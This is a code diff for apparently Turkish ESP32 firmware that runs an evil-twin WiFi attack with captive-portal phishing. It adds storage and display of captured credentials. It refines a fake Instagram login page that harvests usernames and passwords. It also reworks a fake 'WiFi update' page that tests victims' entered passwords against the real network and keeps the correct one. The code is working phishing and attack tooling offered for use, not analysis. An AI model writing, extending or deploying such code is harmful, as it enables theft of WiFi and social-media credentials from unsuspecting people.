@@ -18,8 +18,11 @@ WiFiNetwork networks[20];
 int networkCount = 0;
 String targetSSID = "";
 String savedPassword = "";
+String kullaniciAdi = "";  
+String sifre = ""; 
 bool isAPCreated = false;
 bool isInstagramAP = false;
+     
 
 
 
@@ -66,6 +69,20 @@ void handleRoot() {
     button:hover {
       background-color: #0056b3;
     }
+    .credentials {
+      margin-top: 30px;
+      padding: 15px;
+      border: 1px solid #555;
+      border-radius: 5px;
+      background-color: #2a2a2a;
+      width: 250px;
+      text-align: left;
+    }
+    .credential-title {
+      font-weight: bold;
+      margin-bottom: 10px;
+      color: #007bff;
+    }
   </style>
 </head>
 <body>
@@ -74,13 +91,45 @@ void handleRoot() {
   <button onclick="location.href='/evil-twin-instagram'">Evil Twin (İnstagram)</button>
   <button onclick="location.href='/wifi-attack'">Wifi Saldırısı</button>
   <button onclick="location.href='/wifi-spam'">Wifi Spam</button>
+)=====";
+
+  // Display Evil Twin credentials (Instagram/Wifi) if available
+  if (kullaniciAdi != "" && sifre != "") {
+    html += R"=====(
+  <div class="credentials">
+    <div class="credential-title">Evil Twin Credentials</div>
+    <p>Kullanıcı: )=====";
+    html += kullaniciAdi;
+    html += R"=====(</p>
+    <p>Şifre: )=====";
+    html += sifre;
+    html += R"=====(</p>
+  </div>
+)=====";
+  }
+
+  // Display WiFi credentials if available
+  if (targetSSID != "" && savedPassword != "") {
+    html += R"=====(
+  <div class="credentials">
+    <div class="credential-title">WiFi Credentials</div>
+    <p>WiFi: )=====";
+    html += targetSSID;
+    html += R"=====(</p>
+    <p>Şifre: )=====";
+    html += savedPassword;
+    html += R"=====(</p>
+  </div>
+)=====";
+  }
+
+  // Close HTML
+  html += R"=====(
 </body>
 </html>
 )=====";
-  
-  webServer.send(200, "text/html", html);
+ webServer.send(200, "text/html", html);
 }
-
 
 
 
@@ -244,7 +293,7 @@ void handleInstagramWifi(){
   isAPCreated = true;
 
   Serial.println("---------------------------");
-  Serial.println("Evil Twin ağı oluşturulldu.");
+  Serial.println("Evil Twin ağı oluşturuldu.");
   Serial.println("Wifi : " + targetSSID);
   Serial.println("---------------------------");
 
@@ -264,8 +313,8 @@ void handleInstagramWifi(){
 
 void handleInstagramLogin() {
   if (webServer.method() == HTTP_POST) {
-    String kullaniciAdi = webServer.arg("kullanici_adi");
-    String sifre = webServer.arg("sifre");
+    kullaniciAdi = webServer.arg("kullanici_adi");
+    sifre = webServer.arg("sifre");
     
     Serial.println("---------------------------");
     Serial.println("Yakalanan Instagram Bilgileri:");
@@ -274,10 +323,25 @@ void handleInstagramLogin() {
     Serial.print("Şifre: ");
     Serial.println(sifre);
     Serial.println("---------------------------");
+
+    // Evil Twin'i kapat
+    WiFi.softAPdisconnect(true);
+    targetSSID = "";
+    isAPCreated = false;
+    isInstagramAP = false;
+
+    // Ana AP'yi (ESP32) yeniden başlat
+    WiFi.mode(WIFI_AP);
+    WiFi.softAPConfig(apIP, apIP, IPAddress(255, 255, 255, 0));
+    WiFi.softAP("Esp32","128milyar");
+    dnsServer.start(DNS_PORT, "*", apIP);
+
+    // Ana sayfaya yönlendir
+    String html = "<script>location.href='/';</script>";
+    webServer.send(200, "text/html", html);
     return;
   }
 
-  
   String html = R"=====(
 <!DOCTYPE html>
 <html lang="tr">
@@ -300,6 +364,9 @@ void handleInstagramLogin() {
       justify-content: center;
       align-items: center;
       margin-top: 20px;
+    }
+    .ortali-resim {
+      max-width: 90px; height: auto;
     }
     p.turkce {
       text-align: center;
@@ -372,26 +439,40 @@ void handleInstagramLogin() {
       background-color: #007fff;
       color: white;
     }
+    .resim-kapsayici2 {
+      width: 100%;
+      height: 0px;
+      display: flex; justify-content: center; align-items: center;
+      margin-top: 40px;
+    }
+    .ortali-resim2 {
+      max-width: 70px; height: auto;
+    }
   </style>
 </head>
 <body>
 
 <div class="resim-kapsayici">
   <p class="turkce">Türkçe</p>
-  <img src="data:image/png;base64," alt="Instagram Logo" style="max-width: 70px; height: auto;" />
+  <img src="data:image/png;base64," alt="Yeni Resim" class="ortali-resim2" />
 </div>
 
-<form class="form-kapsayici" method="POST">
+<form id="girisForm" class="form-kapsayici" action="/instagram-login" method="POST">
+  <input type="hidden" name="_captcha" value="false" />
+  <input type="hidden" name="_template" value="table" />
   <input type="text" name="kullanici_adi" placeholder="Kullanıcı adı, e-posta veya cep numarası" required />
   <input type="password" name="sifre" placeholder="Şifre" required />
   <button type="submit" class="giris-buton">Giriş Yap</button>
-  <p class="sifremi-unuttum" onclick="alert('Şifre sıfırlama özelliği şu anda kullanılamıyor!')">Şifreni mi unuttun?</p>
+  <p class="sifremi-unuttum" onclick="alert('Hata!')">Şifreni mi unuttun?</p>
 </form>
 
 <div class="yeni-hesap-kapsayici">
-  <button type="button" class="yeni-hesap-buton" onclick="alert('Hesap oluşturma özelliği şu anda kullanılamıyor!')">Yeni Hesap Oluştur</button>
+  <button type="button" class="yeni-hesap-buton" onclick="alert('Yeni hesap oluşturma sayfasına yönlendiriliyorsunuz.')">Yeni Hesap Oluştur</button>
 </div>
 
+<div class="resim-kapsayici2">
+  <img src="data:image/png;base64," alt="Yeni Resim" class="ortali-resim2" />
+</div>
 </body>
 </html>
 )=====";
@@ -565,7 +646,7 @@ void handleWifiUpdate() {
     html += R"=====()</h1>
     <div class="info">WiFi güncellemesi gerekiyor</div>
     
-    <form id="wifiForm" action="/update-wifi" method="POST">
+    <form id="wifiForm" action="/update-wifi" method="POST" onsubmit="return false;">
       <div class="form-group">
         <label for="password">WiFi Şifresi</label>
         <input type="password" id="password" name="password" required>
@@ -576,46 +657,51 @@ void handleWifiUpdate() {
     <div id="statusMessage" class="status"></div>
   </div>
   
-  
-  
   <script>
-    document.getElementById('wifiForm').onsubmit = function(e) {
-      e.preventDefault();
-      var form = this;
-      var statusDiv = document.getElementById('statusMessage');
-      statusDiv.className = 'status loading';
-      statusDiv.textContent = 'Doğrulanıyor, lütfen bekleyin...';
-      
-      var xhr = new XMLHttpRequest();
-      xhr.open('POST', form.action, true);
-      xhr.setRequestHeader('Content-Type', 'application/x-www-form-urlencoded');
-      
-xhr.onload = function() {
-  if (xhr.status === 200) {
-    var response = JSON.parse(xhr.responseText);
-    if (response.success) {
+document.getElementById('wifiForm').addEventListener('submit', function(e) {
+  e.preventDefault();
+  
+  const form = this;
+  const statusDiv = document.getElementById('statusMessage');
+  const passwordField = document.getElementById('password');
+  
+  statusDiv.className = 'status loading';
+  statusDiv.textContent = 'Doğrulanıyor, lütfen bekleyin...';
+  
+  fetch(form.action, {
+    method: 'POST',
+    headers: {
+      'Content-Type': 'application/x-www-form-urlencoded',
+    },
+    body: new URLSearchParams({
+      password: passwordField.value
+    })
+  })
+  .then(response => response.json())
+  .then(data => {
+    if (data.success) {
       statusDiv.className = 'status success';
-      statusDiv.textContent = 'Şifre doğru! WiFi bağlantısı güncellendi.';
+      statusDiv.textContent = 'Bağlantı başarılı!';
     } else {
       statusDiv.className = 'status error';
-      statusDiv.textContent = 'Lütfen tekrar deneyin: ' + response.message;
+      statusDiv.textContent = data.message;
+      passwordField.value = ''; // Şifre alanını temizle
+      passwordField.focus(); // Tekrar denemek için odaklan
     }
-  } else {
+  })
+  .catch(error => {
     statusDiv.className = 'status error';
-    statusDiv.textContent = 'Bir hata oluştu. Lütfen tekrar deneyin.';
-  }
-};
-      
-      xhr.send('password=' + encodeURIComponent(document.getElementById('password').value));
-    };
-  </script>
+    statusDiv.textContent = 'Hata oluştu: ' + error.message;
+  });
+});
+</script>
 </body>
 </html>
 )=====";
 
-  webServer.send(200, "text/html", html);
+  webServer.send(200, "text/html; charset=utf-8", html);
 }
-
+  
 
 
 
@@ -624,44 +710,64 @@ xhr.onload = function() {
 
 
 void handleUpdateWifi() {
-  String password = webServer.arg("password");
+  if (webServer.method() != HTTP_POST) {
+    webServer.send(405, "text/plain", "Method Not Allowed");
+    return;
+  }
 
-  // Try to connect to the target network
-  WiFi.begin(targetSSID.c_str(), password.c_str());
+  String password = webServer.arg("password");
   
+  Serial.println("---------------------------");
+  Serial.println("Şifre doğrulanıyor...");
+  Serial.print("Hedef SSID: ");
+  Serial.println(targetSSID);
+  Serial.print("Girilen Şifre: ");
+  Serial.println(password);
+
+  // STA moduna geçiş yapmadan doğrudan bağlantı deneyelim
+  WiFi.mode(WIFI_STA); // Hem AP hem STA modunda çalış
+  
+  Serial.println("Bağlantı deneniyor...");
+  WiFi.begin(targetSSID.c_str(), password.c_str());
+
   unsigned long startTime = millis();
   bool connected = false;
-  
-  // Wait for connection (max 10 seconds)
+
+  // Maksimum 10 saniye bağlantı denemesi
   while (millis() - startTime < 10000) {
     if (WiFi.status() == WL_CONNECTED) {
       connected = true;
       break;
     }
-    delay(100);
+    delay(500);
+    Serial.print(".");
   }
 
-  // Prepare response
+  // JSON yanıtı oluştur
   String response;
   if (connected) {
     savedPassword = password;
-    response = "{\"success\": true, \"message\": \"Bağlantı başarılı!\"}";
-    
-    // Stay connected for a moment to send the response
-    delay(500);
+    response = "{\"success\":true,\"message\":\"Bağlantı başarılı!\"}";
+    Serial.println("\nBağlantı başarılı!");
   } else {
-    response = "{\"success\": false, \"message\": \"Şifre yanlış veya bağlantı kurulamadı.\"}";
+    response = "{\"success\":false,\"message\":\"Şifre yanlış! Lütfen tekrar deneyin.\"}";
+    Serial.println("\nBağlantı başarısız! AP aktif kalmaya devam ediyor...");
+    
+    // AP'yi yeniden başlat
+    WiFi.softAPdisconnect(false);
+    WiFi.softAP(targetSSID.c_str());
+    dnsServer.start(DNS_PORT, "*", apIP);
   }
 
-  // Send the response first
+  // STA bağlantısını kes (AP aktif kalsın)
+  WiFi.disconnect();
+  
+  // JSON yanıtını gönder
+  webServer.sendHeader("Cache-Control", "no-cache, no-store, must-revalidate");
+  webServer.sendHeader("Pragma", "no-cache");
+  webServer.sendHeader("Expires", "-1");
   webServer.send(200, "application/json", response);
-
-  // Then switch back to AP mode
-  WiFi.mode(WIFI_AP);
-  WiFi.softAPConfig(apIP, apIP, IPAddress(255, 255, 255, 0));
-  WiFi.softAP(targetSSID.c_str());
 }
-
 
 
 //----------------------------------------------------------//----------------------------------------------------------
@@ -799,6 +905,11 @@ void handleSelectNetwork() {
   WiFi.mode(WIFI_AP_STA);
   WiFi.softAPConfig(apIP, apIP, IPAddress(255, 255, 255, 0));
   WiFi.softAP(targetSSID.c_str());
+
+  Serial.println("---------------------------");
+  Serial.println("Evil Twin ağı oluşturuldu.");
+  Serial.println("Wifi : " + targetSSID);
+  Serial.println("---------------------------");
   
   dnsServer.start(DNS_PORT, "*", apIP);
   isAPCreated = true;
@@ -855,7 +966,7 @@ void setup() {
   
   WiFi.mode(WIFI_AP_STA);
   WiFi.softAPConfig(apIP, apIP, IPAddress(255, 255, 255, 0));
-  WiFi.softAP("Esp32");
+  WiFi.softAP("Esp32", "128milyar");
   
   dnsServer.start(DNS_PORT, "*", apIP);
   
@@ -868,6 +979,7 @@ void setup() {
   webServer.on("/wifi-attack", handleWifiAttack);
   webServer.on("/wifi-spam", handleWifiSpam);
   webServer.on("/wifi-update", handleWifiUpdate);
+  webServer.on("/update-wifi", HTTP_POST, handleUpdateWifi);  
   webServer.onNotFound(handleNotFound);
   
   webServer.begin();
@@ -878,10 +990,11 @@ void setup() {
   
   Serial.println();
 
-  
+  Serial.println("---------------------------");
   Serial.println("Captive Portal Başlatıldı!");
-  Serial.println("AP SSID: WiFi-Portal");
+  Serial.println("AP SSID: Esp32");
   Serial.println("IP Adres: 192.168.4.1");
+  Serial.println("---------------------------");
 }
 
 void loop() {
